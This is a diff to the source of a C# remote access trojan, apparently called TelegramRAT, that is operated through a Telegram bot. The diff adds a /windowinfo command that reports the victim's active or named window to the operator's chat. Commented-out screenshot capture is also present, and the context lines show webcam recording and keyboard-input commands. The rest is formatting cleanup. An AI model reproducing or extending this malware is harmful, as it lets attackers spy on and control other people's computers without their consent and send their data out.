@@ -652,7 +652,7 @@ namespace TelegramRAT
                 Description = "Record video from webcamera for given amount of seconds."
             });
 
-            //SENDKEYBOARDINPUT 
+            //SEND KEYBOARD INPUT 
             commands.Add(new BotCommand
             {
                 Command = "/sendinput",
@@ -877,6 +877,65 @@ namespace TelegramRAT
                             Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with this title!", replyToMessageId: update.Message.MessageId);
                         }
                     });
+                }
+            });
+
+            //WINDOW INFO
+            commands.Add(new BotCommand
+            {
+                Command = "/windowinfo",
+                Execute = (model, update) =>
+                {
+                    Task.Run(() =>
+                    {
+                        try
+                        {
+                            IntPtr hWnd;
+                            if (model.Args.Length > 0)
+                            {
+                                if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
+                                    hWnd = WinAPI.FindWindow(null, model.RawArgs);
+                                else
+                                {
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with such title!", replyToMessageId: update.Message.MessageId);
+                                    return;
+                                }
+                            }
+                            else
+                            {
+
+                                hWnd = WinAPI.GetForegroundWindow();
+                            }
+                            Rectangle windowBounds = WinAPI.GetWindowBounds(hWnd);
+                            string info = "" +
+                            "Window info\n" +
+                            "\n" +
+                            $"Title: <code>{WinAPI.GetWindowTitle(hWnd)}</code>\n" +
+                            $"Location: {windowBounds.X}x{windowBounds.Y}\n" +
+                            $"Size: {windowBounds.Width}x{windowBounds.Height}\n" +
+                            $"Pointer: {hWnd.ToString("X")}";
+
+                            //bitmap bitmap = new bitmap(windowbounds.width, windowbounds.height);
+                            //Graphics thumbnail = Graphics.FromImage(bitmap);
+                            //IntPtr hDc = thumbnail.GetHdc();
+
+                            //WinAPI.PrintWindow(hWnd, hDc, 0);
+
+                            //thumbnail.ReleaseHdc(hDc);
+
+                            //bitmap.save("window.png", imageformat.png);
+
+
+                            Bot.SendTextMessageAsync(update.Message.Chat.Id, info, ParseMode.Html, replyToMessageId: update.Message.MessageId);
+
+                        }
+                        catch (Exception ex)
+                        {
+                            ReportError(update, ex);
+                        }
+
+                    });
+
                 }
             });
 
@@ -1336,7 +1395,7 @@ namespace TelegramRAT
                                     Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is a file with the same name!", replyToMessageId: update.Message.MessageId);
                             }
                         }
-                        catch(Exception ex)
+                        catch (Exception ex)
                         {
                             ReportError(update, ex);
                         }
@@ -1369,7 +1428,7 @@ namespace TelegramRAT
                                     Bot.SendTextMessageAsync(update.Message.Chat.Id, "This path does not exist!", replyToMessageId: update.Message.MessageId);
                             }
                         }
-                        catch(Exception ex)
+                        catch (Exception ex)
                         {
                             ReportError(update, ex);
                         }
@@ -1429,7 +1488,6 @@ namespace TelegramRAT
                     offset = updates.Last().Id + 1;
 
                 UpdateWorker(updates).Wait();
-
 
                 Task.Delay(500).Wait();
             }
